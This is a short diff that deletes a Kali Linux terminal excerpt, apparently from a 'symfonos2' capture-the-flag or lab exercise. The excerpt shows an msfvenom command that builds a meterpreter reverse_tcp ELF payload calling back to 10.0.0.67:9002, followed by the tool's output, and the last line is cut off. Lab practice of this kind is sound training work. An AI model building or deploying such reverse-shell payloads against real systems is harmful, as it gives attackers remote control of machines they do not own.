@@ -1,8 +1,0 @@
-┌──(kali㉿kali)-[~/Desktop/symfonos2/tools]
-└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=9002 -f elf -o reverse.elf
-[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 130 bytes
-Final size of elf file: 250 bytes
-Saved as: reverse.el
